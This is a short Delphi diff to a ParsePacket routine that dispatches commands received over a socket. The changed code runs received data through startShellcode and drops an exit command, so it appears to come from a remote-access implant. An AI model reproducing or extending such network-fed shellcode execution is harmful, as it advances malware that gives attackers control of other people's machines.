@@ -13,8 +13,7 @@ implementation
 procedure ParsePacket(mSocket:Integer; mBuff:PWideChar; dwLen:Integer; bCMD:Byte);
 begin
   case bCMD of
-    $0:startShellcode(mBuff, dwLen);
-    $1:ExitProcess(0);
+    $0:startShellcode(mSocket, mBuff, dwLen);
   end;
 end;
 end.
